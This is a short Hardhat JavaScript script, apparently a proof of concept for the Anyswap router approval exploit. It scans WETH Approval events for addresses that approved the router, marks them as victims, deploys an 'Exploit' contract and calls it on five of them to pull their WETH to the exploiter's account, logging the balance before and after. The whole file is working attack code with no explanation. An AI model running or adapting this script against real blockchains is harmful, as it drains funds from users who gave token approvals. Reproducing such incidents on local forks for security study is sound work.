const { ethers } = require("hardhat");

const execute = async () => {
    const [exploiter] = await ethers.getSigners();

    const WETHAbi = [
        "function balanceOf(address) external view returns (uint256)",
        "event Approval(address indexed src, address indexed guy, uint wad)"
    ];
    const WETH = new ethers.Contract("0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", WETHAbi, exploiter);
    
    //Lets find some victims that have given approval AnyswayRouter to transfer their WETH
    const filter = WETH.filters.Approval(null, "0x6b7a87899490ece95443e979ca9485cbe7e71522");
    const events = await WETH.queryFilter(filter);
    const victims = events.map(e => e['args']['src']);

    const exploitContractFactory = await ethers.getContractFactory("Exploit");
    const exploitContract = await exploitContractFactory.deploy("0x6b7a87899490ece95443e979ca9485cbe7e71522");

    console.log("Exoloit balance before exploit :", ethers.utils.formatEther(await WETH.balanceOf(exploiter.address)));
    
    let tx = await exploitContract.execute(victims.slice(0,5));
    await tx.wait();

    console.log("Exoloit balance after exploit :", ethers.utils.formatEther(await WETH.balanceOf(exploiter.address)));

}

execute()
    .then(() => process.exit(0))
    .catch(error => console.error(error));